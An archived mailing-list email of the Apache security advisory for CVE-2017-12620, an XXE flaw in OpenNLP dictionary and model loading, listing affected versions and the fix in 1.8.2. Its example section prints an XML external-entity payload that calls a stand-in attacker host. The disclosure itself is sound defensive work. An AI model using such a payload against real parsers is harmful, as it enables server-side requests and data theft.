X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["881" "Monday" "2" "October" "2017" "10:36:20" "+0200" "Joern Kottmann" "joern@apache.org" "<CA+V=Wqjnwc7DCAXMGCBPrgfKJHB0bSP03mrSZ0RJxCin5m6L9Q@mail.gmail.com>" "46" "[oss-security] [ANNOUNCE] CVE-2017-12620: Apache OpenNLP XXE vulnerability" "^Date:" nil nil "10" "2017100208:36:20" "[oss-security] [ANNOUNCE] CVE-2017-12620: Apache OpenNLP XXE vulnerability" (number mark "U       joern@apache Oct  2   46/881   " thread-indent "\"[oss-security] [ANNOUNCE] CVE-2017-12620: Apache OpenNLP XXE vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 24064 invoked by uid 550); 2 Oct 2017 14:37:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 20092 invoked from network); 2 Oct 2017 08:36:36 -0000
X-Gm-Message-State: AMCzsaX3r4MWK80g46Lepc83MR22jl6UiP95gO/SE6VAiO0YkhpbjOrz
	qSZTYN51XDA5T8dyktASwvAN1UBihsa+xc4U41A=
X-Google-Smtp-Source: AOwi7QBGeombLKyWKCQU3yEdyVwjnADImhZvCl1x39vG7OlPwjrtudf2Ri6HjsTvltce8UXXcR0oI12jQjTXra8TzEg=
X-Received: by 10.202.1.81 with SMTP id 78mr902559oib.195.1506933380468; Mon,
 02 Oct 2017 01:36:20 -0700 (PDT)
MIME-Version: 1.0
X-Gmail-Original-Message-ID: <CA+V=Wqjnwc7DCAXMGCBPrgfKJHB0bSP03mrSZ0RJxCin5m6L9Q@mail.gmail.com>
Message-ID: <CA+V=Wqjnwc7DCAXMGCBPrgfKJHB0bSP03mrSZ0RJxCin5m6L9Q@mail.gmail.com>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Date: Mon, 2 Oct 2017 10:36:20 +0200
From: Joern Kottmann <joern@apache.org>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] [ANNOUNCE] CVE-2017-12620: Apache OpenNLP XXE vulnerability
To: announce@apache.org, "dev@opennlp.apache.org" <dev@opennlp.apache.org>, 
	"users@opennlp.apache.org" <users@opennlp.apache.org>, security@apache.org, 
	oss-security@lists.openwall.com

Severity: Medium


Vendor:
The Apache Software Foundation


Versions Affected:
OpenNLP 1.5.0 to 1.5.3
OpenNLP 1.6.0
OpenNLP 1.7.0 to 1.7.2
OpenNLP 1.8.0 to 1.8.1


Description:
When loading models or dictionaries that contain XML it is possible to
perform an XXE attack, since OpenNLP is a library, this only affects
applications that load models or dictionaries from untrusted sources.



Mitigation:
All users who load models or XML dictionaries from untrusted sources
should update to 1.8.2.


Example:

An attacker can place this:
<?xml version=3D"1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://evil.attacker.com/">
]>
<r>&sp;</r>

Inside one of the XML files, either a dictionary or embedded inside a
model package, to demonstrate this vulnerability.


Credit:
This issue was discovered by =EF=BB=BFNishil Shah of Salesforce.


Regards,
J=C3=B6rn Kottmann
